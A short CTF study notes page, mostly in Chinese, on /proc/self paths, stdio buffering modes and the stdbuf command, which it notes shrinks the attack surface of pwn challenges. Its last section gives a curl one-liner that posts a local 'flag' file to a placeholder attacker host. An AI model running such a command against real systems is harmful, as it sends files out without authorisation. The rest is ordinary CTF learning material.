

# About /proc

 * /proc/self/cwd - 当前程序路径
 * /proc/self/exe - 当前程序

# Buffer Mode
## Introduction
> The three types of buffering available are unbuffered, block buffered, and line buffered.
> When an output stream is unbuffered, information appears on the destination file or terminal as soon as written; when it is block buffered many characters are saved up and written as a block; when it is line buffered characters are saved up until a newline is output or input is read from any stream attached to a terminal device (typically stdin).
> The function `fflush` may be used to force the block out early.
> Normally all files are block buffered. If a stream refers to a terminal (as stdout normally does), it is line buffered. The standard error stream stderr is always unbuffered by default.

总结一下：
 * buffer有三种模式：unbuffered, block buffered, line buffered
 * unbuffered - 不缓冲，输入的字符立即输出
 * line buffered - 行缓冲，输入的字符遇到`\n`再输出
 * block buffered - 块缓冲，有时也叫全缓冲（应该是遇到EOF再输出叭）可使用`fflush`强行输出
 * stdin和stdout默认line buffered
 * stderr默认unbuffered
 * 其他文件描述符默认block buffered（打开的文件用的就是块缓冲模式）

## stdbuf
### Introduction
> Run COMMAND, with modified buffering operations for its standard streams.

这是一条linux命令，可以以指定的标准文件流缓冲模式运行命令

> 这条命令是我在[WPICTF](/没结束呢)中遇到的（getshell之后dump下来的启动脚本）

脚本内容如下：

``` bash
#!/bin/bash
exec 2> /dev/null
cd /home/ctf/
#sleep 1

./stdbuf -i 0 -o 0 -e 0 ./nanoprint
```

通过`stdbuf`命令，设置`stdin`,`stdout`和`stderr`全部为不缓冲模式，然后运行题目的程序

### Analysis

这条命令很实用啊，一般的题目是通过`setvbuf`在程序运行的开头设置缓冲模式，比如：

```c
setvbuf(stdin,0,2,0);  // 设置stdin的缓冲模式
```

显然程序中的代码越多就越有可能被利用(废话...)

如果程序中有上面这条语句，那么在程序编译后，`bss`段中将存在`stdin`指针

于是就可能存在如下利用方式：
 * heap中变量存在越界读写，可以读写stdin指针，然后篡改`IO_FILE`结构体

 * 从libc中泄漏程序基址(详见[由libc泄漏text](http://note.taqini.space/#/note/attack/leak?id=%e7%94%b1libc%e6%b3%84%e6%bc%8ftext))

然鹅，如果使用`stdbuf`命令启动程序，可以在程序运行前完成缓冲区模式的设置工作。

这样更加安全~

### Conclusion

使用`stdbuf`启动程序，可以避免程序因为使用`setvbuf`造成的相应文件IO指针出现在bss段，从而减少可被利用的点

# curl
通过curl将本地文件发送至目标服务器
``` bash
curl -v --data @flag http://your.site:2333
```
e.g. [wpictf-shell2](https://github.com/ljagiello/wpictf-2020/tree/master/linux/suckmore-shell-2.0)
